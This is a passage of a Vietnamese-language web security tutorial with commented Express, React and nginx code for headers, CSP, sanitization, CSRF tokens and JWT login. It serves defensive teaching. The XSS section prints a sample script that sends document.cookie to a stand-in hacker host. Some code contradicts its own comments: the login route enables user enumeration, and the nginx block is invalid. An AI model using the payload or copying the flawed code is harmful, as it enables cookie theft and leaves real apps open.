  // 💡 parse(): Throw error nếu data không hợp lệ
  // 💡 validated: Data đã được validate → Type-safe

  const result = await db.query(
    'SELECT * FROM users WHERE id = $1', // ✅ Parameterized query
    [validated.id] // ✅ Truyền value qua parameter ($1)
  );
  // 💡 Parameterized: Database tự động escape → Ngăn SQL injection
  // 💡 $1: Placeholder → Database thay thế an toàn
});
```

**C. CORS (Cross-Origin Resource Sharing - Chia Sẻ Tài Nguyên Đa Nguồn)**

```typescript
// Whitelist specific origins (Chỉ cho phép các domain cụ thể)
app.use(
  cors({
    origin: ['https://app.example.com', 'https://admin.example.com'],
    // 💡 origin: Danh sách domain được phép gọi API
    // 💡 Chỉ requests từ các domain này mới được phép
    // 💡 Requests từ domain khác → Browser BLOCK → CORS error

    credentials: true, // ✅ Allow cookies
    // 💡 credentials: Cho phép gửi cookies với requests
    // 💡 Cần cho authentication (session cookies)

    methods: ['GET', 'POST', 'PUT', 'DELETE'], // ✅ Chỉ cho phép các methods này
    // 💡 methods: HTTP methods được phép
    // 💡 OPTIONS, PATCH... → Không được phép

    allowedHeaders: ['Content-Type', 'Authorization'], // ✅ Chỉ cho phép các headers này
    // 💡 allowedHeaders: Headers được phép gửi
    // 💡 Headers khác → Browser BLOCK
  })
);
// 💡 CORS: Ngăn website khác gọi API của bạn
// 💡 Chỉ frontend của bạn mới gọi được API → An toàn hơn
```

---

#### **Tầng 7: Security Headers (Headers Bảo Mật)**

**Vai trò:** 🛡️ Browser-level protections thông qua HTTP headers
// 💡 Security Headers: Headers HTTP chỉ định cách browser xử lý trang web
// 💡 Browser đọc headers → Áp dụng các biện pháp bảo mật tự động

**Critical headers (Các headers quan trọng):**

```typescript
// ✅ helmet.js tự động set các headers bảo mật (KHUYẾN NGHỊ)
import helmet from 'helmet';
app.use(helmet());
// 💡 helmet.js: Middleware tự động set các security headers
// 💡 Đơn giản, nhanh chóng, đầy đủ → Best practice

// Hoặc manual configuration (Cấu hình thủ công):
app.use((req, res, next) => {
  // 1. 🔒 Content-Security-Policy (CSP) - Chính sách bảo mật nội dung
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted-cdn.com"
  );
  // 💡 CSP: Chỉ định nguồn nào được phép load resources
  // 💡 default-src 'self': Mặc định chỉ load từ cùng domain
  // 💡 script-src 'self' https://trusted-cdn.com: Script chỉ từ domain + CDN tin cậy
  // 💡 → Script từ evil.com → Browser BLOCK → XSS thất bại

  // 2. 🚫 X-Frame-Options - Ngăn embed trong iframe
  res.setHeader('X-Frame-Options', 'DENY');
  // 💡 DENY: Không cho embed trang web trong iframe
  // 💡 Ngăn clickjacking: Hacker embed trang trong iframe → Lừa user click
  // 💡 VD: Hacker embed bank.com trong iframe → User click → Thực ra click vào evil.com

  // 3. 🔍 X-Content-Type-Options - Ngăn browser đoán content type
  res.setHeader('X-Content-Type-Options', 'nosniff');
  // 💡 nosniff: Browser không được đoán content type
  // 💡 Ngăn MIME sniffing attacks: Hacker upload file độc → Browser đoán sai → Chạy script
  // 💡 VD: File .txt nhưng chứa script → Browser đoán là .html → Chạy script → XSS

  // 4. 🔐 Strict-Transport-Security (HSTS) - Bắt buộc HTTPS
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );
  // 💡 max-age=31536000: 1 năm (31,536,000 giây)
  // 💡 includeSubDomains: Áp dụng cho tất cả subdomain
  // 💡 preload: Đưa vào HSTS preload list của browser
  // 💡 → Browser tự động chuyển HTTP → HTTPS → Ngăn SSL stripping

  // 5. 🔗 Referrer-Policy - Chính sách referrer
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  // 💡 strict-origin-when-cross-origin: Chỉ gửi origin, không gửi full URL
  // 💡 Ngăn leak thông tin: URL có thể chứa sensitive data (tokens, IDs...)
  // 💡 VD: https://site.com/page?token=abc123 → Chỉ gửi https://site.com

  // 6. 🚫 Permissions-Policy - Chính sách permissions
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=()'
  );
  // 💡 geolocation=(): Disable geolocation API
  // 💡 microphone=(): Disable microphone access
  // 💡 camera=(): Disable camera access
  // 💡 → Disable các permissions không cần thiết → Bảo vệ privacy

  next();
});
```

**Header impact (Tác động của headers):**

- ✅ **CSP**: Block 90%+ XSS attacks
  // 💡 Content-Security-Policy: Ngăn load script từ nguồn không tin cậy
  // 💡 XSS attack: Inject script → CSP block → Thất bại
  // 💡 Hiệu quả: Block 90%+ XSS attacks

- ✅ **HSTS**: Ngăn SSL stripping attacks
  // 💡 SSL Stripping: Hacker chuyển HTTPS → HTTP → Intercept data
  // 💡 HSTS: Browser tự động chuyển HTTP → HTTPS → Ngăn SSL stripping

- ✅ **X-Frame-Options**: Prevent clickjacking
  // 💡 Clickjacking: Hacker embed trang trong iframe → Lừa user click
  // 💡 X-Frame-Options: DENY → Không cho embed → Ngăn clickjacking

- ✅ **Referrer-Policy**: Bảo vệ privacy
  // 💡 Referrer: Thông tin về trang web trước đó
  // 💡 Referrer-Policy: Giới hạn thông tin gửi đi → Bảo vệ privacy

---

**❓ Tình Huống:**

Bạn là Senior Frontend Developer phụ trách security cho Trading Platform xử lý:

- **Sensitive Data**: User credentials, trading orders, financial transactions
- **API Calls**: 1000+ requests/minute đến backend APIs
- **User Input**: Form submissions, search queries, comments
- **Third-party Integration**: Payment gateways, analytics, CDN

**Threats (Mối đe dọa):**

- XSS attacks (inject malicious scripts)
- CSRF attacks (force unwanted actions)
- Man-in-the-Middle (intercept data)
- Session hijacking
- Data exposure in client-side code

**Yêu cầu:** Thiết kế và implement chiến lược bảo mật toàn diện (defense in depth).

**✅ Đáp Án Chi Tiết:**

**🛡️ 7 Tầng Bảo Mật (7-Layer Security Strategy):**

```
┌──────────────────────────────────────────────────────────────┐
│              WEB SECURITY LAYERS                              │
├──────────────────────────────────────────────────────────────┤
│  1️⃣ HTTPS + TLS (Transport Layer Security)                  │
│  2️⃣ XSS Prevention (Cross-Site Scripting)                   │
│  3️⃣ CSRF Protection (Cross-Site Request Forgery)            │
│  4️⃣ Authentication & Authorization                          │
│  5️⃣ Secure Storage                                          │
│  6️⃣ API Security                                            │
│  7️⃣ Security Headers                                        │
└──────────────────────────────────────────────────────────────┘
```

**Code Example (TypeScript + React):**

```typescript
// ============================================
// 1️⃣ HTTPS + TLS (BẢO MẬT TẦNG TRUYỀN TẢI)
// ============================================

// Giải thích: HTTPS mã hóa dữ liệu giữa browser ↔ server
// Ngăn Man-in-the-Middle attack (hacker không đọc được data)

// 🌐 Cấu hình Nginx Server (Web Server Configuration)
server {
  listen 443 ssl http2;  // 🔒 Port 443 = HTTPS, http2 = protocol mới nhanh hơn
  // 💡 Port 443: Port mặc định cho HTTPS
  // 💡 ssl: Bật SSL/TLS encryption
  // 💡 http2: HTTP/2 protocol → Nhanh hơn HTTP/1.1 (multiplexing, header compression)

  # 🔐 HSTS (HTTP Strict Transport Security): Bắt buộc dùng HTTPS
  # Giải thích: Browser tự động chuyển HTTP → HTTPS trong 1 năm
  # includeSubDomains: Áp dụng cho tất cả subdomain (api.example.com, cdn.example.com)
  # preload: Đưa vào HSTS preload list của browser (bảo mật từ lần truy cập đầu)
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
  // 💡 max-age=31536000: 1 năm (31,536,000 giây)
  // 💡 includeSubDomains: Áp dụng cho tất cả subdomain → Bảo mật toàn bộ domain
  // 💡 preload: Đưa vào danh sách preload của browser → Bảo mật ngay từ lần đầu
  // 💡 always: Luôn gửi header, kể cả khi có lỗi

  # 📜 Cấu hình SSL/TLS Certificate (Chứng chỉ bảo mật)
  ssl_certificate /path/to/cert.pem;          # Public certificate (chứng chỉ công khai)
  // 💡 cert.pem: Certificate file (chứng chỉ công khai)
  // 💡 Chứa: Domain name, Public key, CA signature
  // 💡 Browser verify certificate → Xác minh server là thật

  ssl_certificate_key /path/to/key.pem;       # Private key (khóa bí mật)
  // 💡 key.pem: Private key file (khóa bí mật)
  // 💡 Dùng để decrypt data → PHẢI giữ bí mật!
  // 💡 ⚠️ Không bao giờ commit vào git, không share

  # 🔒 Chỉ cho phép TLS 1.2 và 1.3 (phiên bản mới, bảo mật)
  # Không dùng TLS 1.0, 1.1 (đã lỗi thời, có lỗ hổng)
  ssl_protocols TLSv1.2 TLSv1.3;
  // 💡 TLSv1.2: Phiên bản 1.2 (an toàn, được hỗ trợ rộng rãi)
  // 💡 TLSv1.3: Phiên bản 1.3 (mới nhất, nhanh và an toàn nhất)
  // 💡 ⚠️ Không dùng TLSv1.0, TLSv1.1: Đã lỗi thời, có lỗ hổng bảo mật

  # 🔐 Cipher suite: Thuật toán mã hóa
  # HIGH = mã hóa mạnh, !aNULL = không dùng cipher không xác thực, !MD5 = không dùng MD5 (yếu)
  ssl_ciphers HIGH:!aNULL:!MD5;
  // 💡 HIGH: Chỉ dùng cipher suite mạnh (AES-256, ChaCha20...)
  // 💡 !aNULL: Không dùng cipher không xác thực (nguy hiểm)
  // 💡 !MD5: Không dùng MD5 (đã bị crack, không an toàn)
  // 💡 → Chỉ dùng các thuật toán mã hóa mạnh, an toàn
}

// ============================================
// 2️⃣ XSS PREVENTION (NGĂN CHẶN TẤN CÔNG XSS)
// ============================================

// Giải thích XSS (Cross-Site Scripting):
// Hacker inject malicious script vào web → script chạy → steal cookies, redirect, keylog
// VD: User nhập comment: <script>fetch('https://hacker.com?cookie='+document.cookie)</script>

// 🛡️ A. Input Sanitization (Làm Sạch Input) với DOMPurify
import DOMPurify from 'dompurify'; // 📦 DOMPurify: Library sanitize HTML
import { useState, useMemo } from 'react';
// 💡 DOMPurify: Loại bỏ script tags và các thẻ nguy hiểm từ HTML
// 💡 Tại sao cần: User input có thể chứa malicious code → Phải sanitize trước khi lưu

function CommentForm({ onSubmit }) {
  const [comment, setComment] = useState(''); // 📝 State lưu comment của user

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault(); // 🚫 Ngăn form submit mặc định (reload page)

    // ✅ Sanitize input: Loại bỏ script tags và các thẻ nguy hiểm
    const sanitized = DOMPurify.sanitize(comment, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],  // ✅ Chỉ cho phép các thẻ an toàn
      // 💡 ALLOWED_TAGS: Whitelist các thẻ HTML được phép
      // 💡 'b', 'i', 'em', 'strong': Format text (bold, italic...)
      // 💡 'a': Link (cần thiết cho comment có link)
      // 💡 <script>, <iframe>, <img onerror>... → Bị xóa

      ALLOWED_ATTR: ['href']  // ✅ Chỉ cho phép attribute 'href' (cho thẻ <a>)
      // 💡 ALLOWED_ATTR: Whitelist các attributes được phép
      // 💡 'href': Cho phép link có href
      // 💡 onerror, onclick, onload... → Bị xóa (nguy hiểm!)
    });
    // 💡 Kết quả sanitize:
    // 💡 "<script>alert('xss')</script>" → "" (bị xóa hoàn toàn)
    // 💡 "<img src='x' onerror='alert(1)'>" → "" (bị xóa vì onerror)
    // 💡 "<b>Text</b>" → "<b>Text</b>" (giữ lại vì an toàn)
    // 💡 "<a href='https://example.com'>Link</a>" → Giữ lại (an toàn)

    onSubmit(sanitized); // 📤 Gửi comment đã sanitize lên server
  };

  return (
    <form onSubmit={handleSubmit}>
      <textarea
        value={comment} // 📝 Controlled component: Value từ state
        onChange={(e) => setComment(e.target.value)} // ✏️ Update state khi user nhập
        placeholder="Nhập comment của bạn..."
      />
      <button type="submit">Gửi Comment</button> {/* 🚀 Submit form */}
    </form>
  );
}

// ✅ Safe Display: Hiển thị HTML an toàn
function SafeComment({ content }) {
  // 💡 Component này hiển thị HTML từ database (comment, post...)
  // 💡 ⚠️ NGUY HIỂM: Nếu không sanitize → XSS attack!

  // ✅ useMemo: Chỉ sanitize lại khi content thay đổi (tối ưu performance)
  const sanitized = useMemo(() => {
    return DOMPurify.sanitize(content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],  // ✅ Cho phép format text cơ bản
      // 💡 'b', 'i', 'em', 'strong': Format text (bold, italic...)
      // 💡 'a': Link
      // 💡 'p': Paragraph
      // 💡 <script>, <iframe>, <img onerror>... → Bị xóa

      ALLOWED_ATTR: ['href', 'target'],  // ✅ Cho phép link
      // 💡 'href': URL của link
      // 💡 'target': _blank để mở tab mới
      // 💡 onerror, onclick... → Bị xóa

      ALLOW_DATA_ATTR: false  // 🚫 Không cho phép data-* attributes (có thể chứa script)
      // 💡 data-*: Custom attributes (VD: data-onclick="...")
      // 💡 Có thể chứa malicious code → Phải disable
    });
  }, [content]); // 📊 Chỉ chạy lại khi content thay đổi
  // 💡 useMemo: Tránh sanitize lại mỗi lần render → Tối ưu performance

  // ⚠️ dangerouslySetInnerHTML: Render HTML string (Tên "dangerous" nhắc nhở nguy hiểm!)
  // 💡 dangerouslySetInnerHTML: React render HTML string trực tiếp
  // 💡 ⚠️ NGUY HIỂM: Nếu HTML không sanitize → XSS attack!
  // 💡 ✅ AN TOÀN: Đã sanitize với DOMPurify → Chỉ HTML an toàn được render
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
  // 💡 __html: Property đặc biệt của React để render HTML
  // 💡 sanitized: HTML đã được DOMPurify làm sạch → An toàn
}

// ❌ VÍ DỤ TẤN CÔNG XSS:
// User nhập: <img src="x" onerror="alert('XSS')">
// Không sanitize → img load lỗi → chạy onerror → alert hiện
// Có sanitize → DOMPurify xóa onerror attribute → an toàn

// 🛡️ B. Content Security Policy (CSP) - Chính sách bảo mật nội dung
// CSP: Header chỉ định nguồn nào được phép load scripts, styles, images
// Server: Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",  // 🔒 Mặc định chỉ load từ cùng domain
      // 💡 default-src: Policy mặc định cho tất cả resources
      // 💡 'self': Chỉ cho phép load từ cùng origin (domain)
      // 💡 → Block tất cả resources từ domain khác (trừ khi được whitelist)

      "script-src 'self' https://trusted-cdn.com",  // ✅ Script chỉ từ domain + CDN tin cậy
      // 💡 script-src: Policy cho JavaScript files
      // 💡 'self': Script từ cùng domain → Cho phép
      // 💡 https://trusted-cdn.com: CDN tin cậy (VD: cdnjs, unpkg...)
      // 💡 → Script từ evil.com → BLOCK → XSS thất bại

      "style-src 'self' 'unsafe-inline'",  // ✅ CSS từ domain + inline styles (cần cho React)
      // 💡 style-src: Policy cho CSS files
      // 💡 'self': CSS từ cùng domain → Cho phép
      // 💡 'unsafe-inline': Cho phép inline styles (<style>...</style>)
      // 💡 ⚠️ Cần 'unsafe-inline' vì React inject inline styles

      "img-src 'self' data: https:",  // ✅ Image từ domain + data URLs + HTTPS
      // 💡 img-src: Policy cho images
      // 💡 'self': Images từ cùng domain → Cho phép
      // 💡 data:: Cho phép data URLs (data:image/png;base64,...)
      // 💡 https:: Cho phép images từ bất kỳ HTTPS URL nào

      "connect-src 'self' https://api.example.com",  // ✅ Fetch/WebSocket chỉ đến API
      // 💡 connect-src: Policy cho fetch, XMLHttpRequest, WebSocket
      // 💡 'self': Requests đến cùng domain → Cho phép
      // 💡 https://api.example.com: API endpoint → Cho phép
      // 💡 → Fetch đến evil.com → BLOCK → Ngăn data leak

      "frame-ancestors 'none'"  // 🚫 Không cho embed trong iframe (chống clickjacking)
      // 💡 frame-ancestors: Policy cho iframe embedding
      // 💡 'none': Không cho phép embed trang này trong iframe
      // 💡 → Ngăn clickjacking: Hacker không thể embed trang trong iframe
    ].join('; ') // 🔗 Join các policies bằng dấu '; '
  );
  next(); // ➡️ Tiếp tục middleware chain
});
// 💡 Kết quả: Nếu hacker inject <script src="https://evil.com/hack.js"></script>
// 💡 → Browser check CSP → evil.com không trong script-src whitelist
// 💡 → Browser BLOCK script → XSS thất bại ✅
// 💡 → Hiệu quả: Block 90%+ XSS attacks!

// ============================================
// 3️⃣ CSRF PROTECTION (NGĂN CHẶN TẤN CÔNG CSRF)
// ============================================

// Giải thích CSRF (Cross-Site Request Forgery):
// Hacker lừa user click link → browser tự động gửi request (kèm cookies) → thực hiện action không mong muốn
// VD: User đang login bank.com → click link evil.com → evil.com trigger POST /transfer → tiền bị chuyển

import { useEffect, useState } from 'react';
import { randomBytes } from 'crypto';

// 🔐 SERVER: Generate CSRF Token (Tạo CSRF Token)
// Tạo token ngẫu nhiên cho mỗi session, lưu ở server
app.get('/api/csrf-token', (req, res) => {
  // 💡 Endpoint này tạo CSRF token cho client
  // 💡 Client gọi endpoint này khi cần token (VD: Khi load form)

  // ✅ Tạo token ngẫu nhiên 32 bytes (256 bits) → rất khó đoán
  const token = randomBytes(32).toString('hex');
  // 💡 randomBytes(32): Tạo 32 bytes ngẫu nhiên (256 bits)
  // 💡 toString('hex'): Convert sang hexadecimal string
  // 💡 VD: "a1b2c3d4e5f6..." (64 ký tự hex)
  // 💡 256 bits → 2^256 khả năng → Cực kỳ khó đoán!

  // ✅ Lưu token vào session (server-side, hacker không access được)
  req.session.csrfToken = token;
  // 💡 req.session: Session object (lưu ở server, không ở client)
  // 💡 Hacker không thể đọc session → Không biết token
  // 💡 Token được lưu server-side → An toàn

  // 📤 Trả token cho client
  res.json({ csrfToken: token });
  // 💡 Client nhận token → Lưu vào state/memory
  // 💡 Client gửi token cùng với request (body hoặc header)
  // 💡 Server verify token → Khớp mới xử lý request
});

// 🔒 API endpoint cần bảo vệ (Transfer money - Chuyển tiền)
app.post('/api/transfer', (req, res) => {
  const { csrfToken, amount, toAccount } = req.body;
  // 💡 req.body: Data từ client gửi lên
  // 💡 csrfToken: Token từ client (gửi trong body hoặc header)
  // 💡 amount: Số tiền chuyển
  // 💡 toAccount: Tài khoản nhận

  // ✅ Verify CSRF token: So sánh token từ client vs token trong session
  if (csrfToken !== req.session.csrfToken) {
    // 💡 So sánh: Token từ client vs Token trong session
    // 💡 Không khớp → Có thể là CSRF attack → Reject!
    console.log('❌ CSRF token không hợp lệ');
    return res.status(403).json({ error: 'Invalid CSRF token' });
    // 💡 403 Forbidden: Không có quyền (token không hợp lệ)
    // 💡 → Request bị reject → CSRF attack thất bại ✅
  }

  // ✅ Token hợp lệ → xử lý transfer
  console.log(`✅ Chuyển $${amount} đến ${toAccount}`);
  // 💡 Token khớp → Request hợp lệ → Xử lý bình thường
  // Process transfer logic...
  // 💡 Logic chuyển tiền: Validate amount, check balance, update database...
  res.json({ success: true });
  // 💡 Trả về success → Chuyển tiền thành công
});
// 💡 Tại sao CSRF token hoạt động:
// 💡 1. Hacker không biết token (token trong session, hacker không đọc được)
// 💡 2. Request từ evil.com thiếu token hoặc token sai
// 💡 3. Server verify → Token không hợp lệ → Reject → CSRF thất bại ✅

// 🔑 CLIENT: Hook lấy CSRF token (Custom hook để lấy CSRF token)
function useCsrfToken() {
  const [csrfToken, setCsrfToken] = useState(''); // 📦 State lưu CSRF token
  // 💡 csrfToken: Token để gửi với requests
  // 💡 '' (empty): Chưa có token (đang fetch)

  useEffect(() => {
    // 🔄 Fetch token từ server khi component mount
    fetch('/api/csrf-token') // 📡 Gọi API lấy token
      .then(res => res.json()) // 📦 Parse JSON response
      .then(data => setCsrfToken(data.csrfToken)) // 💾 Lưu token vào state
      // 💡 data.csrfToken: Token từ server response
      // 💡 setCsrfToken: Update state → Component re-render

      .catch(err => console.error('❌ Lỗi lấy CSRF token:', err));
      // 💡 catch: Xử lý lỗi nếu fetch fail (network error, server error...)
  }, []); // 📊 Empty deps → Chỉ chạy 1 lần khi component mount
  // 💡 []: Không phụ thuộc vào props/state nào → Chỉ fetch 1 lần

  return csrfToken; // 📤 Trả về token
  // 💡 Components sử dụng hook này sẽ nhận được token
  // 💡 Usage: const token = useCsrfToken();
}

// 💰 Component Form chuyển tiền (Form component với CSRF protection)
function TransferForm() {
  const csrfToken = useCsrfToken();  // 🔑 Lấy token từ hook
  // 💡 useCsrfToken(): Hook trả về CSRF token
  // 💡 Token được fetch tự động khi component mount

  const [amount, setAmount] = useState(''); // 💵 State: Số tiền chuyển
  const [toAccount, setToAccount] = useState(''); // 🏦 State: Tài khoản nhận

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault(); // 🚫 Ngăn form submit mặc định (reload page)
    // 💡 preventDefault(): Ngăn browser submit form → Không reload page

    // ✅ Gửi CSRF token cùng request
    // Cách 1: Trong body (Gửi trong request body)
    // Cách 2: Trong custom header (X-CSRF-Token) - Khuyến nghị
    await fetch('/api/transfer', {
      method: 'POST', // 📡 POST request
      headers: {
        'Content-Type': 'application/json', // 📝 Content type
        'X-CSRF-Token': csrfToken  // 🔑 Gửi token qua header
        // 💡 X-CSRF-Token: Custom header chứa CSRF token
        // 💡 Server đọc header này để verify token
      },
      body: JSON.stringify({
        amount, // 💵 Số tiền
        toAccount, // 🏦 Tài khoản nhận
        csrfToken  // 🔑 Cũng gửi trong body (double check)
        // 💡 Gửi cả header và body → Double check → An toàn hơn
        // 💡 Server verify cả 2 nơi → Đảm bảo token hợp lệ
      })
    });
    // 💡 Server verify CSRF token → Khớp mới xử lý transfer
    // 💡 Token không hợp lệ → Reject → CSRF attack thất bại ✅
  };

  return (
    <form onSubmit={handleSubmit}>
      {/* 💵 Input: Số tiền */}
      <input
        type="number" // 🔢 Chỉ cho phép nhập số
        value={amount} // 📝 Controlled component: Value từ state
        onChange={(e) => setAmount(e.target.value)} // ✏️ Update state khi user nhập
        placeholder="Số tiền"
      />

      {/* 🏦 Input: Tài khoản nhận */}
      <input
        type="text" // 📝 Text input
        value={toAccount} // 📝 Controlled component
        onChange={(e) => setToAccount(e.target.value)} // ✏️ Update state
        placeholder="Tài khoản nhận"
      />

      {/* 🚀 Submit button */}
      <button type="submit">Chuyển Tiền</button>
      {/* 💡 type="submit": Trigger form submit → Gọi handleSubmit */}
    </form>
  );
}
// 💡 Form này có CSRF protection → An toàn khỏi CSRF attacks
// 💡 Mọi request đều có CSRF token → Server verify → Chỉ request hợp lệ mới được xử lý

// TẠI SAO CSRF TOKEN HOẠT ĐỘNG?
// 1. Site evil.com KHÔNG thể đọc token từ bank.com (Same-Origin Policy)
// 2. Browser tự động gửi cookies → nhưng KHÔNG tự động gửi custom headers/body
// 3. Request từ evil.com thiếu token → server reject → CSRF thất bại

// ============================================
// 4️⃣ AUTHENTICATION & AUTHORIZATION (XÁC THỰC & PHÂN QUYỀN)
// ============================================

// Giải thích JWT (JSON Web Token):
// Token chứa thông tin user (id, email, role) được mã hóa
// Server ký token bằng secret key → client không thể fake token
// 2 loại token: Access Token (ngắn hạn) + Refresh Token (dài hạn)

import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';

// 🔐 SERVER: Login API (API đăng nhập)
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body; // 📦 Lấy email và password từ request body
  // 💡 req.body: Data client gửi lên (từ form hoặc JSON)

  // 🔍 Tìm user trong database
  const user = await User.findOne({ email }); // 📊 Tìm user theo email
  // 💡 User.findOne(): Query database tìm user có email này
  // 💡 await: Đợi database query hoàn thành

  if (!user) {
    // ❌ User không tồn tại → Trả lỗi 401 Unauthorized
    return res.status(401).json({ error: 'Email không tồn tại' });
    // 💡 401: Unauthorized - Không có quyền (email không đúng)
    // 💡 ⚠️ Lưu ý: Không nói rõ "email không tồn tại" vs "password sai" → Tránh user enumeration
  }

  // 🔐 Verify password (so sánh với hash trong DB)
  const validPassword = await bcrypt.compare(password, user.passwordHash);
  // 💡 bcrypt.compare(): So sánh password plaintext vs password hash
  // 💡 Password trong DB được hash với bcrypt → Không lưu plaintext
  // 💡 bcrypt.compare() tự động hash password input và so sánh với hash trong DB
  // 💡 An toàn: Không cần decrypt (không thể decrypt bcrypt hash)

  if (!validPassword) {
    // ❌ Password không đúng → Trả lỗi 401
    return res.status(401).json({ error: 'Mật khẩu không đúng' });
    // 💡 401: Unauthorized - Không có quyền (password sai)
  }

  // ✅ Generate Access Token (Token truy cập - ngắn hạn: 15 phút)
  // Tại sao ngắn hạn? Nếu bị đánh cắp → hacker chỉ dùng được 15 phút
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email, role: user.role },  // 📦 Payload: thông tin user
    // 💡 Payload: Data được encode vào token
    // 💡 userId: ID của user (dùng để query database)
    // 💡 email: Email của user (hiển thị, không dùng để auth)
    // 💡 role: Vai trò của user (admin, user...) → Dùng cho authorization

    process.env.JWT_SECRET!,  // 🔑 Secret key để ký token (giữ bí mật)
    // 💡 JWT_SECRET: Key bí mật để ký token (PHẢI giữ bí mật!)
    // 💡 process.env: Environment variable → Không commit vào git
    // 💡 !: TypeScript non-null assertion (đảm bảo có giá trị)

    { expiresIn: '15m' }  // ⏰ Token hết hạn sau 15 phút
    // 💡 expiresIn: Thời gian token hợp lệ
    // 💡 '15m': 15 phút
    // 💡 Ngắn hạn → Nếu bị steal, hacker chỉ dùng được 15 phút
  );

  // ✅ Generate Refresh Token (Token làm mới - dài hạn: 7 ngày)
  // Dùng để lấy access token mới khi access token hết hạn
  const refreshToken = jwt.sign(
    { userId: user.id },  // 📦 Payload đơn giản hơn (chỉ userId)
    // 💡 Refresh token chỉ cần userId → Đơn giản, ít data
    // 💡 Không cần email, role → Giảm kích thước token

    process.env.REFRESH_TOKEN_SECRET!,  // 🔑 Secret key khác với access token
    // 💡 REFRESH_TOKEN_SECRET: Key riêng cho refresh token
    // 💡 ⚠️ QUAN TRỌNG: Phải khác với JWT_SECRET!
    // 💡 Lý do: Nếu 1 key bị leak → Key kia vẫn an toàn

    { expiresIn: '7d' }  // ⏰ 7 ngày
    // 💡 '7d': 7 ngày
    // 💡 Dài hạn hơn access token → User không cần login lại thường xuyên
  );

  // ✅ Lưu refresh token vào httpOnly cookie
  // httpOnly: JavaScript KHÔNG đọc được → XSS không steal được
  // secure: Chỉ gửi qua HTTPS
  // sameSite: 'strict' → chống CSRF (cookie không gửi từ site khác)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,  // ✅ JS không access được (chống XSS)
    // 💡 httpOnly: Cookie chỉ gửi với HTTP requests
    // 💡 JavaScript KHÔNG đọc được → document.cookie không thấy
    // 💡 XSS attack → Không steal được refresh token

    secure: true,    // ✅ Chỉ gửi qua HTTPS
    // 💡 secure: Cookie chỉ gửi qua HTTPS (không HTTP)
    // 💡 Ngăn cookie bị intercept qua HTTP (man-in-the-middle)

    sameSite: 'strict',  // ✅ Chống CSRF
    // 💡 sameSite: 'strict' → Cookie chỉ gửi cho same-site requests
    // 💡 Request từ evil.com → Browser KHÔNG gửi cookie → CSRF thất bại

    maxAge: 7 * 24 * 60 * 60 * 1000  // ⏰ 7 ngày (milliseconds)
    // 💡 maxAge: Thời gian cookie tồn tại
    // 💡 7 * 24 * 60 * 60 * 1000 = 604,800,000ms = 7 ngày
  });

  // 📤 Trả access token cho client (lưu trong memory, KHÔNG localStorage)
  res.json({ accessToken, user: { id: user.id, email: user.email } });
  // 💡 accessToken: Trả về trong response body
  // 💡 Client lưu trong React state/memory → Không persist
  // 💡 ⚠️ KHÔNG lưu vào localStorage → XSS có thể steal
  // 💡 user: Thông tin user cơ bản (không nhạy cảm)
});

// 🔄 API làm mới access token (Refresh Token Endpoint)
app.post('/api/refresh', async (req, res) => {
  const { refreshToken } = req.cookies; // 🍪 Lấy refresh token từ cookie
  // 💡 req.cookies: Cookies được gửi từ browser
  // 💡 refreshToken: Cookie chứa refresh token (đã set ở login)
  // 💡 Browser tự động gửi cookie với request (credentials: 'include')

  if (!refreshToken) {
    // ❌ Không có refresh token → Trả lỗi 401
    return res.status(401).json({ error: 'Không có refresh token' });
    // 💡 401: Unauthorized - Chưa đăng nhập hoặc cookie đã hết hạn
    // 💡 User cần login lại
  }

  try {
    // ✅ Verify refresh token (Xác minh token hợp lệ)
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET!);
    // 💡 jwt.verify(): Verify token signature và expiration
    // 💡 Nếu token hợp lệ → Trả về decoded payload
    // 💡 Nếu token không hợp lệ (sai signature, hết hạn...) → Throw error
    // 💡 REFRESH_TOKEN_SECRET: Key để verify refresh token (phải khớp với key khi sign)

    // ✅ Generate access token mới (Tạo access token mới)
    const newAccessToken = jwt.sign(
      { userId: decoded.userId }, // 📦 Payload: Chỉ cần userId
      // 💡 decoded.userId: Lấy từ refresh token payload
      // 💡 Không cần query database → Nhanh hơn

      process.env.JWT_SECRET!, // 🔑 Secret key để ký access token
      { expiresIn: '15m' } // ⏰ Hết hạn sau 15 phút
    );
    // 💡 Tạo access token mới với thời hạn 15 phút
    // 💡 User không cần login lại → UX tốt

    res.json({ accessToken: newAccessToken }); // 📤 Trả access token mới
    // 💡 Client nhận access token mới → Update state
    // 💡 Refresh token vẫn giữ nguyên trong cookie → Không cần set lại
  } catch (error) {
    // ❌ Refresh token không hợp lệ (hết hạn, sai signature...)
    res.status(403).json({ error: 'Refresh token không hợp lệ' });
    // 💡 403: Forbidden - Token không hợp lệ
    // 💡 User cần login lại
    // 💡 ⚠️ Có thể clear cookie refreshToken ở đây để force login
  }
});
// 💡 Flow: Client gọi /api/refresh → Server verify refresh token → Trả access token mới
// 💡 Lợi ích: User không cần login lại thường xuyên (refresh token 7 ngày)
// 💡 Security: Access token ngắn hạn (15 phút) → Giảm thiệt hại nếu bị steal

// 🔐 CLIENT: Auth Context với auto-refresh (Context xác thực với tự động làm mới token)
import { createContext, useContext, useEffect, useState } from 'react';

const AuthContext = createContext<{ accessToken: string | null }>({ accessToken: null });
// 💡 AuthContext: Context để share access token cho toàn bộ app
// 💡 accessToken: Token để gọi API (lưu trong memory, không persist)

function AuthProvider({ children }) {
  const [accessToken, setAccessToken] = useState<string | null>(null);
  // 💡 accessToken: State lưu access token
  // 💡 null: Chưa có token (chưa login hoặc đã logout)
  // 💡 string: Có token → Có thể gọi API

  // ✅ Auto-refresh token trước khi hết hạn
